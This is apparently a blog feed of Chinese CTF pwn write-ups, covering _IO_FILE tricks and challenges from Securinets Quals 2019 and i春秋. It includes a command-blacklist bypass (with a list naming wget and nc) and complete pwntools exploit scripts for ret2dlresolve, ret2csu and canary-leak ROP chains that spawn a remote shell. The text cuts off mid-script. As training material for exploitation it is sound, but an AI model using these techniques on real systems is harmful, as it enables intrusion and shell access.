f-&gt;<span class="variable">_IO_write_ptr</span> += <span class="built_in">count</span>;<span class="comment">//此时_IO_write_ptr 等于 _IO_write_end</span></span><br><span class="line">      ....</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>只需要<code>f-&gt;_IO_write_end - f-&gt;_IO_write_ptr = 0</code> 即可绕过memcpy.</p><hr><p>后面任意读的操作和前面putchar的绕过方法是相同，主要就是设置flags位来绕过。<br>然后设置_IO_write_base为想要泄露的地址，_IO_write_ptr为想要泄露的末尾地址即可。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>c语言_IO_缓冲区的思想是：<br>如果是从文件读，就先从文件读入数据填充输入缓冲区，让程序慢慢用，用完了再读入。<br>如果是向文件写，就先把想要写的内容写入输出缓冲区，等输出缓冲区满了，再一次性的写入文件中。<br>通过跟输入有关的函数(scanf等)只能达到任意写的目的，需要修改stdin结构体里的_IO_buf_base为想要修改的位置的起始地址，_IO_buf_end为想要修改的位置的末地址即可。<br>通过跟输出有关的函数(puts等)可以达到任意读写的目标，需要修改stdout结构体里的_IO_write_base,_IO_write_end指针。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;最近的题目(最近两年的国赛，HCTF2018)中出现了很多关于_IO_FILE的利用，不是hou
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Securinets CTF Quals 2019 部分pwn题wp</title>
    <link href="http://yoursite.com/2019/03/24/Securinets-CTF-Quals-2019-%E9%83%A8%E5%88%86pwn%E9%A2%98wp/"/>
    <id>http://yoursite.com/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/</id>
    <published>2019-03-24T14:05:39.000Z</published>
    <updated>2019-03-25T09:27:06.258Z</updated>
    
    <content type="html"><![CDATA[<p>tctf难到自闭，中途报了个别的ctf。写下三道pwn题的wp，有一道题在大佬的帮助下学到了新姿势，之前以为这种栈溢出是没法做的，还有一道格式化串的题一直做不出来。。等wp出来以后再复现了。。</p><h4 id="welocome"><a href="#welocome" class="headerlink" title="welocome"></a>welocome</h4><p>pwn的签到题。<br>程序源代码如下：<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> search(<span class="keyword">char</span> <span class="keyword">str</span>[], <span class="keyword">char</span> word[])</span><br><span class="line">    <span class="keyword">int</span> l, i, j;</span><br><span class="line">    <span class="comment">/*length of word */</span></span><br><span class="line">   <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; <span class="keyword">str</span>[i] != <span class="string">'\0'</span> &amp;&amp; word[j] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">str</span>[i] == word[j])</span><br><span class="line">        &#123;</span><br><span class="line">            j++;<span class="comment">//相等j++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j == l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* substring found */</span></span><br><span class="line">        <span class="keyword">return</span> (i - j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>  - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> delete_word(<span class="keyword">char</span> <span class="keyword">str</span>[], <span class="keyword">char</span> word[], <span class="keyword">int</span> <span class="keyword">index</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i, l;</span><br><span class="line">    <span class="comment">/* length of word */</span></span><br><span class="line">    <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++); <span class="comment">//遍历word数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="keyword">index</span>; <span class="keyword">str</span>[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">str</span>[i] = <span class="keyword">str</span>[i + l + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> * blacklist[]=&#123;<span class="string">"cat"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"more"</span>,<span class="string">"cp"</span>,<span class="string">"man"</span>,<span class="string">"scp"</span>,<span class="string">"xxd"</span>,<span class="string">"dd"</span>,<span class="string">"od"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"ruby"</span>,<span class="string">"tac"</span>,<span class="string">"rev"</span>,<span class="string">"xz"</span>,<span class="string">"tar"</span>,<span class="string">"zip"</span>,<span class="string">"gzip"</span>,<span class="string">"mv"</span>,<span class="string">"flag"</span>,<span class="string">"txt"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"vi"</span>,<span class="string">"vim"</span>,<span class="string">"nano"</span>,<span class="string">"pico"</span>,<span class="string">"awk"</span>,<span class="string">"grep"</span>,<span class="string">"egrep"</span>,<span class="string">"echo"</span>,<span class="string">"find"</span>,<span class="string">"exec"</span>,<span class="string">"eval"</span>,<span class="string">"regexp"</span>,<span class="string">"tail"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"cut"</span>,<span class="string">"tr"</span>,<span class="string">"pg"</span>,<span class="string">"du"</span>,<span class="string">"`"</span>,<span class="string">"$"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"#"</span>,<span class="string">"bzip2"</span>,<span class="string">"cmp"</span>,<span class="string">"split"</span>,<span class="string">"paste"</span>,<span class="string">"diff"</span>,<span class="string">"fgrep"</span>,<span class="string">"gawk"</span>,<span class="string">"iconv"</span>,<span class="string">"ln"</span>,<span class="string">"most"</span>,<span class="string">"open"</span>,<span class="string">"print"</span>,<span class="string">"read"</span>,<span class="string">"&#123;"</span>,<span class="string">"&#125;"</span>,<span class="string">"sort"</span>,<span class="string">"uniq"</span>,<span class="string">"tee"</span>,<span class="string">"wget"</span>,<span class="string">"nc"</span>,<span class="string">"hexdump"</span>,<span class="string">"HOSTTYPE"</span>,<span class="string">"$"</span>,<span class="string">"arch"</span>,<span class="string">"env"</span>,<span class="string">"tmp"</span>,<span class="string">"dev"</span>,<span class="string">"shm"</span>,<span class="string">"lock"</span>,<span class="string">"run"</span>,<span class="string">"var"</span>,<span class="string">"snap"</span>,<span class="string">"nano"</span>,<span class="string">"read"</span>,<span class="string">"readlink"</span>,<span class="string">"zcat"</span>,<span class="string">"tailf"</span>,<span class="string">"zcmp"</span>,<span class="string">"zdiff"</span>,<span class="string">"zegrep"</span>,<span class="string">"zdiff"</span>&#125;;</span><br><span class="line">cat head less more cp man scp xxd dd</span><br><span class="line"> <span class="keyword">char</span> <span class="keyword">str</span>[<span class="number">80</span>], word[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">index</span>;</span><br><span class="line">    printf(<span class="string">"Welcome to Securinets Quals CTF \o/ \n"</span>);</span><br><span class="line">    printf(<span class="string">"Enter string:\n"</span>);</span><br><span class="line">    read(<span class="number">0</span>,<span class="keyword">str</span>,<span class="number">79</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;sizeof(blacklist)/sizeof(blacklist[<span class="number">0</span>]);i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">index</span> = search(<span class="keyword">str</span>, blacklist[i]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">index</span> !=  - <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        delete_word(<span class="keyword">str</span>, blacklist[i], <span class="keyword">index</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setreuid(geteuid(),geteuid());</span><br><span class="line">close(<span class="number">0</span>);</span><br><span class="line">system(<span class="keyword">str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序就是让你输入命令，然后system执行，但是设置了命令黑名单。查看文件和flag等字符串都不让输入。但是匹配算法有点问题，匹配的是输入的字符串的后面部分，输入<code>cat flag.txt cat flag.txt</code>即可绕过。</p><h3 id="baby2"><a href="#baby2" class="headerlink" title="baby2"></a>baby2</h3><p><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/2.png" alt=""><br>这道题目只有一个栈溢出，但是没有任何leak，看到这道题目的第一感觉就是ret2dl_runtime_resolve,关于这个利用技术，网上有很多，这里就不细说了。<br>虽然这个利用方法比较难，但是这道题的难点不在这，而是栈溢出在main函数中，在之前，我一直以为这种栈溢出是不能做的，遇到一个人很好的pwn师傅给我提供了思路。<br><strong>main函数和其他函数的栈布局有所不同</strong>。注意图中画红方框的地方。<br>函数开始部分：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lea</span>    <span class="built_in">ecx</span>, [<span class="built_in">esp</span>+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">and</span>    <span class="built_in">esp</span>, <span class="number">0FFFFFFF0h</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">ecx</span></span><br></pre></td></tr></table></figure></p><p>此时栈布局大概是这样的：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/3.png" alt=""><br>saved ecx的值等于 ebp +8<br>当函数结束时：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_4]</span><br><span class="line"><span class="keyword">leave</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">esp</span>, [<span class="built_in">ecx</span>-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>将saved ecx的值赋值给ecx，然后再将ecx-4 赋值给esp，再ret。<br>这里ecx的存在有点像canary。<br>保存在栈中saved ecx -4 才是最后esp的值，如果栈中的saved ecx，被破坏了，程序就会崩溃。<br>如图：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/4.png" alt=""><br>红框即是saved ecx。<br>他此时指向：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/5.png" alt=""><br>最后的ESP即是：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/6.png" alt=""></p><p>正常的栈溢出的做法是 返回地址以上的空间全是padding，从返回地址开始写ROP，<strong>但是这样saved ecx的值就被破坏掉</strong>。<br>例如：<br>全用AAAA。。。填充缓冲区，那么saved ecx的地址被覆盖为0x41414141。<br><code>Program received signal SIGSEGV (fault address 0x4141413d)</code><br>此时ESP的值等于0x4141413d，是一个无效的地址。这样程序根本进入不了ROP，我开始的想法是将ECX覆盖为某个函数的got-4，但是参数无法布置。</p><p><strong>解决办法：</strong><br>将第一段ROP写在buf中，即写在缓冲区中。再将saved ecx的高位第一个字节覆盖掉，覆盖为buf地址+4 的高位第一个字节，那么返回的地址就返回到buf中了。虽然开启了ASLR，但还是有几率爆破成功。<strong>但是地址选择要保证高位第二个字节是相等的</strong>。例如：<br><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/7.png" alt=""><br><strong>要保证爆破的地址，高位第二个字节是相等的，因为我们只能控制高位第一个字节</strong>。</p><p>本题还有一个坑点，就是<br><code>return read(0, &amp;buf, 0x12Cu);</code><br><strong>read读取的长度是0x12c，连续发送两段payload，会连在一起，使用了sleep仍然不行，要使用raw_input或者pause</strong>。</p><p>exp如下：(要多试几次才能成功)<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#a=process("./baby2")</span></span><br><span class="line">a=remote(<span class="string">"51.254.114.246"</span>,<span class="string">"2222"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(a,"b *0x80484a3")</span></span><br><span class="line">elf=ELF(<span class="string">"./baby2"</span>)</span><br><span class="line">read_plt=elf.plt[<span class="string">"read"</span>]</span><br><span class="line">rel_plt_addr=0x80482d8</span><br><span class="line">dynsym_addr=0x80481d0</span><br><span class="line">dynstr_addr=0x8048240</span><br><span class="line">plt0_addr=0x8048320</span><br><span class="line">pop3_ret=0x08048509</span><br><span class="line">bss_addr=elf.bss()+0x20</span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr=bss_addr</span><br><span class="line"></span><br><span class="line">arg_offset=fake_rel_plt_addr - rel_plt_addr<span class="comment">#dl_reslove(linkmap,arg_offset)</span></span><br><span class="line"></span><br><span class="line">fake_dynsym_addr=fake_rel_plt_addr + 0x8   <span class="comment">#fake_dynsym address</span></span><br><span class="line"></span><br><span class="line">align=16-(fake_dynsym_addr-dynsym_addr)%16  <span class="comment">#align</span></span><br><span class="line">fake_dynsym_addr+=align                 </span><br><span class="line"></span><br><span class="line">r_info=(((fake_dynsym_addr-dynsym_addr)/16)&lt;&lt;8)|0x7 <span class="comment">#rel_plt's r_info</span></span><br><span class="line"></span><br><span class="line">fake_dynstr_addr=fake_dynsym_addr+16   </span><br><span class="line">sh_addr=fake_dynstr_addr + 7</span><br><span class="line">offset=fake_dynstr_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line">payload+=p32(read_plt) <span class="comment">#read</span></span><br><span class="line">payload+=p32(pop3_ret) <span class="comment">#pop pop pop ret</span></span><br><span class="line">payload+=p32(0)        <span class="comment">#fd</span></span><br><span class="line">payload+=p32(bss_addr) <span class="comment">#buf</span></span><br><span class="line">payload+=p32(0x100)    <span class="comment">#length</span></span><br><span class="line">payload+=p32(plt0_addr)<span class="comment">#PLT[0]</span></span><br><span class="line">payload+=p32(arg_offset)</span><br><span class="line">payload+=p32(pop3_ret) <span class="comment">#return address</span></span><br><span class="line">payload+=p32(sh_addr)<span class="comment">#/bin/sh address</span></span><br><span class="line">payload=payload.ljust((0x30-4),<span class="string">"\x00"</span>)</span><br><span class="line">payload+='\x9c'</span><br><span class="line">a.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=p32(elf.got[<span class="string">"read"</span>])<span class="comment">#fake_rel_plt</span></span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+='A'*align     <span class="comment">#padding</span></span><br><span class="line">payload+=p32(offset)+p32(0)+p32(0)+p32(0x12) <span class="comment">#fake dynsym</span></span><br><span class="line">payload+=<span class="string">"system\x00"</span> <span class="comment">#fake dynstr</span></span><br><span class="line">payload+=<span class="string">"/bin/sh\x00"</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="baby1"><a href="#baby1" class="headerlink" title="baby1"></a>baby1</h3><p><img src="/2019/03/24/Securinets-CTF-Quals-2019-部分pwn题wp/1.png" alt=""></p><p>64位程序，一个基本栈溢出，由于没有给出动态库，可以配合pwntools的DynELF模块泄露system函数地址，也可以随便泄露一个地址再匹配动态库，再计算出system函数地址。<br>直接放exp:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">a=remote(<span class="string">"51.254.114.246"</span>,1111)</span><br><span class="line">elf=ELF(<span class="string">"./baby1"</span>)</span><br><span class="line">write_got=elf.got[<span class="string">"write"</span>]</span><br><span class="line">start_addr=0x400500</span><br><span class="line">def leak(addr):</span><br><span class="line">    a.recvuntil(<span class="string">"Welcome to securinets Quals!\n"</span>)</span><br><span class="line">    payload='A'*56</span><br><span class="line">    payload+=p64(0x0000000004006BA)<span class="comment">#csu</span></span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(write_got)</span><br><span class="line">    payload+=p64(8)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(0x0000000004006A0)<span class="comment">#csu </span></span><br><span class="line">    payload+='A'*56</span><br><span class="line">    payload+=p64(start_addr)</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    return a.recv(8)</span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">system_addr=d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">log.info(<span class="string">"system_addr = 0x%x"</span>%(system_addr));</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">def exp():</span><br><span class="line">    a.recvuntil(<span class="string">"Welcome to securinets Quals!\n"</span>)</span><br><span class="line">    payload='A'*56</span><br><span class="line">    payload+=p64(0x0000000004006BA)<span class="comment">#csu</span></span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(1)</span><br><span class="line">    payload+=p64(read_got)</span><br><span class="line">    payload+=p64(10)</span><br><span class="line">    payload+=p64(elf.bss())</span><br><span class="line">    payload+=p64(0)</span><br><span class="line">    payload+=p64(0x0000000004006A0)<span class="comment">#csu </span></span><br><span class="line">    payload+='A'*56</span><br><span class="line">    payload+=p64(0x00000000004006c3)</span><br><span class="line">    payload+=p64(elf.bss())</span><br><span class="line">    payload+=p64(system_addr)</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">    a.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    a.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;tctf难到自闭，中途报了个别的ctf。写下三道pwn题的wp，有一道题在大佬的帮助下学到了新姿势，之前以为这种栈溢出是没法做的，还有一道格式化串的题一直做不出来。。等wp出来以后再复现了。。&lt;/p&gt;
&lt;h4 id=&quot;welocome&quot;&gt;&lt;a href=&quot;#welocome
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>i春秋pwnable-writeup</title>
    <link href="http://yoursite.com/2019/03/08/i%E6%98%A5%E7%A7%8Bpwnable-writeup/"/>
    <id>http://yoursite.com/2019/03/08/i春秋pwnable-writeup/</id>
    <published>2019-03-08T14:15:13.000Z</published>
    <updated>2019-03-08T14:37:54.308Z</updated>
    
    <content type="html"><![CDATA[<h4 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello!I am the smartest robot in the universe!\nWho are you?"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Your name %s sounds so stupid!\nBut you don't looks like a fool,isn't it?\nso why don't tell me your real name?\n"</span>,</span><br><span class="line">    &amp;buf);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>64位程序，开启了canary和nx防护。<br>利用思路如下：<br>1.通过第一次的输入，覆盖canary高位的第一个字节为\x0a,利用printf中的%s，将canary的值打印出来。<br>2.由于题目没有给出动态库。可以通过puts泄露got表项内容，通过比对获知目标机器使用的动态库，或者写leak函数，结合pwntools的DynELF，泄露库中函数地址。<br>3.通过第二次溢出，构造ROPchain，利用read读取/bin/sh到bss段，接着调用system，获取shell。<br>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line">a=remote(<span class="string">"106.75.2.53"</span>,10002)</span><br><span class="line">elf=ELF(<span class="string">"./easypwn"</span>)</span><br><span class="line">pop_rdi_ret=0x4007f3 <span class="comment">#pop rdi ret</span></span><br><span class="line">def leak(addr):</span><br><span class="line">    a.recvuntil(<span class="string">"Who are you?\n"</span>)</span><br><span class="line">    payload='A'*72</span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">    canary=u64(a.recv(8))-0xa</span><br><span class="line">    a.recv()</span><br><span class="line">    payload='A'*72+p64(canary)</span><br><span class="line">    payload+='B'*8 <span class="comment"># fake rbp</span></span><br><span class="line">    payload+=p64(pop_rdi_ret)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    payload+=p64(elf.plt[<span class="string">"puts"</span>])</span><br><span class="line">    payload+=p64(0x4005D0)<span class="comment"># start address</span></span><br><span class="line">    a.sendline(payload)</span><br><span class="line">    a.recvuntil(<span class="string">"Oh!This one is better,nice to meet you!\nGoodbye!See you again!\n"</span>)</span><br><span class="line">    data=<span class="string">""</span></span><br><span class="line">    up=<span class="string">""</span></span><br><span class="line">    while True:</span><br><span class="line">        c=a.recv(1)</span><br><span class="line">        if up==<span class="string">"\n"</span> and c ==<span class="string">"H"</span>:</span><br><span class="line">            data=data[:-1]</span><br><span class="line">            data=data+<span class="string">"\x00"</span></span><br><span class="line">            break</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data+=c</span><br><span class="line">        up=c</span><br><span class="line">    return data[:4]</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">system_addr=d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line"><span class="comment">#libc=LibcSearcher("system",system_addr)</span></span><br><span class="line">print(<span class="string">"system_addr = "</span>+hex(system_addr))</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">a.recvuntil(<span class="string">"Who are you?\n"</span>)</span><br><span class="line">payload='A'*72</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*72)</span><br><span class="line">canary=u64(a.recv(8))-0xa</span><br><span class="line">a.recv()</span><br><span class="line"><span class="comment">#ret2csu</span></span><br><span 